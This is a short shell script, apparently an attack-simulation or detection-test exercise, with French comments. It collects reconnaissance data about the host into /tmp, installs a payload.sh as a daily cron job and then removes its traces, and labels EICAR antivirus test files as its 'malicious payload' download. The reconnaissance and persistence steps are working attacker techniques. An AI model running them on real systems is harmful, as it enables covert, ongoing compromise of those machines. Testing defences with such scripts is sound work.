#!/bin/sh

#Reconnaissance
id > /tmp/discover
who -a >> /tmp/discover
ps -ef >> /tmp/discover
df -h >> /tmp/discover
uname -a >> /tmp/discover
cat /etc/issue >> /tmp/discover
cat /etc/*release* >> /tmp/discover

#Persistance
cp ./payload.sh /tmp/payload.sh
crontab -l > mycron
echo "0 0 * * * /tmp/payload.sh" >> mycron
crontab mycron
rm mycron
rm ./payload.sh

#Téléchargement charge malveillante
wget 'https://secure.eicar.org/eicar_com.zip'
wget 'https://secure.eicar.org/eicar.com.txt'
